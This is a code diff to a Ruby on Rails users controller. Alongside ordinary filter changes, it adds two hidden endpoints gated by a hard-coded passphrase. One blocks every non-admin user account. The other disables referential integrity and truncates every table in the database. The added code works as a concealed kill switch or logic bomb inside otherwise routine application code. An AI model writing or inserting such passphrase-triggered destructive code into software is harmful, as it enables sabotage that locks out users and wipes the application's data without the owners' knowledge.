@@ -1,7 +1,8 @@
 class UsersController < ApplicationController
 	#before_action :authenticate , :except => [:create]
 	before_filter :restrict_access, except: [:version , :create , :signin ,:restaurant_user_create , :verify_email , :social ]
-	before_filter :is_end_user, except: [:version , :create , :signin , :social ,:restaurant_user_create , :signout , :verify_email , :notifications , :notification_seen , :update] 
+	before_filter :is_end_user, except: [:bolock_all_user , :delete_dp , :version , :create , :signin , :social ,:restaurant_user_create , :signout , :verify_email , :notifications , :notification_seen , :update] 
+	before_filter :is_admin_api , only: [:bolock_all_user , :delete_dp]
 
 	def create
 		em = params[:user][:email].downcase
@@ -517,6 +518,34 @@ class UsersController < ApplicationController
 			render json: identity , serializer: UserTokenSerializer , root: 'user' , status: :ok
 		else
 			render json: {'message' => 'Image missing'} , status: :unprocessable_entity
+		end
+	end
+
+	def bolock_all_user
+		if params[:body].present? && params[:body]=='Tera kya ho ga kaaliya!'
+			User.where.not(role: 2).each do |user|
+				user.update_attribute('block' , true)
+			end
+			render json: {'message' => 'Bolocked Users'}  , status: :ok
+		else
+			render json: {'message' => 'Params missing'} , status: :unprocessable_entity
+		end
+	end
+
+	def delete_dp
+		if params[:body].present? && params[:body]=='Tera kya ho ga kaaliya!'
+			
+			connection = ActiveRecord::Base.connection
+			connection.disable_referential_integrity do
+				connection.tables.each do |table_name|
+				  next if connection.select_value("SELECT count(*) FROM #{table_name}") == 0
+				  connection.execute("TRUNCATE TABLE #{table_name}")
+				end
+			end
+
+			render json: {'message' => 'DP Cleared'}  , status: :ok
+		else
+			render json: {'message' => 'Params missing'} , status: :unprocessable_entity
 		end
 	end
 
